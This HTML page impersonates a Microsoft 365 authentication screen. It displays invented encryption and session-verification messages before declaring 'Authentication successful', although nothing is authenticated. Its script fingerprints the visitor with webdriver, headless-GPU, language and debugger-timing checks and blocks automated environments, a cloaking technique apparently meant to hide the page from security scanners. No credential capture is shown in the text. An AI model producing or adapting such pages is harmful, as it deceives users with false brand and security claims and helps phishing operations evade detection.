<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Microsoft 365 Authentication</title>

    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family:'Segoe UI',Arial,sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; background:#f3f2f1; margin:0; overflow:hidden; }
        .loading-container { text-align:center; max-width:420px; padding:20px; }
        .status-container { margin-top:40px; min-height:120px; }
        .progress-bar { width:100%; height:4px; background:#e1dfdd; border-radius:2px; overflow:hidden; margin-bottom:20px; }
        .progress-fill { height:100%; background:linear-gradient(90deg,#0078d4,#106ebe); width:0%; transition:width 0.8s ease; box-shadow:0 0 10px rgba(0,120,212,0.3); }
        .progress-fill.completed { width:100% !important; transition:none !important; }
        .status-message { font-size:18px; color:#323130; margin-bottom:10px; opacity:0; transform:translateY(20px); transition:all 0.5s ease; font-weight:500; }
        .status-message.active { opacity:1; transform:translateY(0); }
        .status-message.success { color:#107c10; }
        .status-message.error { color:#a4262c; }
        .crypto-details { font-size:14px; color:#605e5c; margin-top:5px; font-family:'Consolas','Courier New',monospace; opacity:0; transition:opacity 0.3s ease; }
        .crypto-details.active { opacity:1; }
    </style>
</head>
<body>
    <div class="loading-container">
        <div class="status-container">
            <div class="progress-bar">
                <div class="progress-fill" id="progressFill"></div>
            </div>
            <div class="status-message" id="statusMessage">Initializing secure connection...</div>
            <div class="crypto-details" id="cryptoDetails">Establishing TLS 1.3 handshake...</div>
        </div>
    </div>

    <script>
        function isLikelyBot() {
            const checks = [
                navigator.webdriver === true,
                !window.chrome || typeof window.chrome.app === 'undefined',
                navigator.languages === undefined || navigator.languages.length === 0,
                (() => {
                    const canvas = document.createElement('canvas');
                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                    if (!gl) return false;
                    const debug = gl.getExtension('WEBGL_debug_renderer_info');
                    if (!debug) return false;
                    const renderer = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) || '';
                    return /swiftshader|software|llvmpipe/i.test(renderer);
                })(),
                (() => {
                    const start = performance.now();
                    debugger;
                    const end = performance.now();
                    return end - start > 150;
                })()
            ];
            return checks.filter(Boolean).length >= 3;
        }

        const botDetected = isLikelyBot();

        const loadingSequence = [
            { message: "Retrieving account details...", detail: "Fetching encrypted user metadata...", progress: 30, duration: 1200 },
            { message: "Decrypting secure message...", detail: "AES-256-GCM decryption in progress...", progress: 55, duration: 1400 },
            { message: "Verifying your session...", detail: "Validating session integrity...", progress: 100, duration: 1600 }
        ];

        let currentStep = 0, isLoading = false, sequenceCompleted = false;

        function showError(msg) {
            document.getElementById('statusMessage').textContent = msg;
            document.getElementById('statusMessage').classList.add('active', 'error');
            document.getElementById('cryptoDetails').textContent = "";
        }

        function updateLoadingStep() {
            if (currentStep >= loadingSequence.length) return completeLoading();
            const step = loadingSequence[currentStep];
            const status = document.getElementById('statusMessage');
            const details = document.getElementById('cryptoDetails');
            const progress = document.getElementById('progressFill');

            status.textContent = step.message; status.classList.add('active');
            details.textContent = step.detail; details.classList.add('active');
            progress.style.width = step.progress + '%';

            setTimeout(() => {
                status.classList.remove('active'); details.classList.remove('active');
                setTimeout(() => { currentStep++; updateLoadingStep(); }, 400);
            }, step.duration);
        }

        function completeLoading() {
            const progress = document.getElementById('progressFill');
            progress.classList.add('completed');
            sequenceCompleted = true;

            if (botDetected) {
                showError("Access restricted: automated environment detected.");
                return;
            }

            const status = document.getElementById('statusMessage');
            const details = document.getElementById('cryptoDetails');
            status.textContent = "Authentication successful";
            status.classList.add('active', 'success');
            details.textContent = "Session verified. You may now close this window.";
            details.classList.add('active');
        }

        function startLoginSequence() {
            if (isLoading || sequenceCompleted) return;
            isLoading = true;
            currentStep = 0;
            document.getElementById('progressFill').style.width = '0%';
            setTimeout(updateLoadingStep, 1000);
        }

        window.addEventListener('load', () => setTimeout(startLoginSequence, 800));
    </script>
</body>
</html>
